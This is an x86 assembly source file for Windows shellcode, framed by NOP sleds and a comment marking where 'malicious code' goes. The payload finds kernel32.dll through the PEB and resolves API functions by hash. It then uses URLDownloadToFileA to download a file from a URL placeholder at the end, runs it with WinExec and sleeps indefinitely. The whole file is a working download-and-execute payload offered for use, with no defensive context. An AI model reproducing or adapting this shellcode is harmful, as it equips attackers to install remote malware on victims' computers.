global _start
  
section .text

_start:
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
; -------------------------------------------
; enter malicious code here
; -------------------------------------------
    
payload_start:
    jmp     store_payload_end_address

get_payload_end_address:
    pop     edi                         ; edi = payload end address
    call    get_kernel32_dll_base       ; eax = kernel32.dll base address

payload_body:
    mov     ebx, eax                    ; ebx = kernel32.dll base address
    push    eax                         ; push kernel32.dll base address
    push    dword 0xec0e4e8e            ; push LoadLibraryA name hash
    call    find_function

call_LoadLibraryA:
;   HMODULE WINAPI LoadLibrary(
;       _In_  LPCTSTR lpFileName
;   );

    xor     ecx, ecx                    ; ecx = 0
    mov     cx, 0x6e6f                  ; cx = "no"
    push    ecx                         ; push 0x0000"no"
    push    dword 0x6d6c7275            ; push "mlru"
    push    esp                         ; lpFileName = "urlmon"
    call    eax                         ; call LoadLibraryA -> eax = urlmon.dll base
    push    eax                         ; push urlmon.dll base
    push    dword 0x702f1a36            ; push URLDownloadToFileA name hash
    call    find_function

call_URLDownloadToFileA:
;   HRESULT URLDownloadToFile(
;       LPUNKNOWN pCaller,
;       LPCTSTR szURL,
;       LPCTSTR szFileName,
;       _Reserved_  DWORD dwReserved,
;       LPBINDSTATUSCALLBACK lpfnCB
;   );

    xor     ecx, ecx                    ; ecx = 0
    push    ecx                         ; lpfnCB = NULL (we don't need callback)
    push    ecx                         ; dwReserved = NULL (must be 0)
    lea     esi, [edi]                  ; esi = address of filename to save downloaded file
    push    esi                         ; szFilename = esi
    lea     esi, [edi + 0x14]           ; esi = address of URL name
    push    esi                         ; szURL = esi
    push    ecx                         ; pCaller = NULL (caller is not an ActiveX object)
    call    eax                         ; call URLDownloadToFileA
    push    ebx                         ; push kernel32.dll base address
    push    dword 0xe8afe98             ; push WinExec name hash
    call    find_function

call_WinExec:
;   UINT WINAPI WinExec(
;       _In_  LPCSTR lpCmdLine,
;       _In_  UINT uCmdShow
;   );

    push    0x5                         ; uCmdShow = SW_SHOW (show the window)
    push    edi                         ; lpCmdLine = downloaded filename
    call    eax                         ; call WinExec
    push    ebx                         ; push kernel32.dll base address
    push    dword 0xdb2d49b0            ; push Sleep name hash
    call    find_function

call_Sleep:
;   VOID WINAPI Sleep(
;       _In_  DWORD dwMilliseconds
;   );

    xor     ecx, ecx                    ; ecx = 0
    dec     ecx                         ; ecx = 0xffffffff
    push    ecx                         ; dwMilliseconds = INFINITY
    call    eax                         ; call Sleep, payload end...

get_kernel32_dll_base:
    push    ebp                         ; save ebp
    push    esi                         ; save esi
    mov     eax, [fs:0x30]              ; eax = PEB
    mov     eax, [eax + 0xc]            ; eax = Ldr
    mov     esi, [eax + 0x1c]           ; esi = first entry in the initialization order module list
    lodsd                               ; eax = second entry, which is kernel32.dll
    mov     ebp, [eax + 0x8]            ; ebp = base address of kernel32.dll
    mov     eax, ebp                    ; eax = base address of kernel32.dll
    pop     esi                         ; restore esi
    pop     ebp                         ; restore ebp
    ret                                 ; jmp payload_body

find_function:
    push    ebx                         ; save ebx
    push    ebp                         ; save ebp
    push    esi                         ; save esi
    push    edi                         ; save edi
    mov     ebp, [esp + 0x18]           ; ebp = base address of DLL (module) to be loaded
    mov     eax, [ebp + 0x3c]           ; eax = address of DLL's PE header (0x3c = offset to e_lfanew within DOS header)
    mov     edx, [ebp + eax + 0x78]     ; edx = RVA of Export Directory (ebp + eax + 0x79 = first entry in Data Directory)
    add     edx, ebp                    ; edx = address of Export Directory
    mov     ecx, [edx + 0x18]           ; ecx = number of exported functions (IMAGE_EXPORT_DIRECTORY::NumberOfNames)
    mov     ebx, [edx + 0x20]           ; ebx = RVA of ENT (Export Name Table)
    add     ebx, ebp                    ; ebx = address of ENT

find_function_loop:
    jecxz   resolve_error               ; if(ecx == 0) then last symbol was checked, nothing matches -> error
    dec     ecx                         ; --ecx
    mov     esi, [ebx + ecx * 4]        ; esi = RVA of next exported symbol name
    add     esi, ebp                    ; esi = address of next exported symbol name
    xor     edi, edi                    ; edi = 0 (it will hold exported symbol name hash)
    cld                                 ; clear the direction flag to ensure that it increments instead of decrements when using the lods* instructions

compute_hash:
    xor     eax, eax                    ; eax = 0
    lodsb                               ; load the byte pointed by esi (the current symbol name character) into al, ++esi
    cmp     al, ah                      ; al == 0
    jz      check_hash                  ; if ZF is set, then end of the string has been reached -> jump hash checking
    ror     edi, 0xd                    ; hash >>= 13
    add     edi, eax                    ; hash += current name character
    jmp     compute_hash

check_hash:
    cmp     edi, [esp + 0x14]           ; hash == desired function hash
    jnz     find_function_loop          ; hash doesn't match, check next symbol
    mov     ebx, [edx + 0x24]           ; ebx = RVA of exported functions ordinals (IMAGE_EXPORT_DIRECTORY::AddressOfNameOrdinals)
    add     ebx, ebp                    ; ebx = address of exported functions ordinals
    mov     cx, [ebx + ecx * 2]         ; cx = ordinal of function to be resolved (ecx = function index, 2 = sizeof(ordinal))
    mov     ebx, [edx + 0x1c]           ; ebx = RVA of EAT (Export Address Table)
    add     ebx, ebp                    ; ebx = address of EAT
    mov     eax, [ebx + ecx * 4]        ; eax = RVA of desired function
    add     eax, ebp                    ; eax = address of desired function
    mov     edx, ebp                    ; edx = base address of DLL to be loaded
    pop     edi                         ; restore edi
    pop     esi                         ; restore esi
    pop     ebp                         ; restore ebp
    pop     ebx                         ; restore ebx
    ret                                 ; call_LoadLibraryA | call_URLDownloadToFileA | call_WinExec | call_Sleep

resolve_error:
    jmp resolve_error

store_payload_end_address:
    call    get_payload_end_address

    ; here goes filename of downloaded file
    ; here goes URL to download

; -------------------------------------------
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop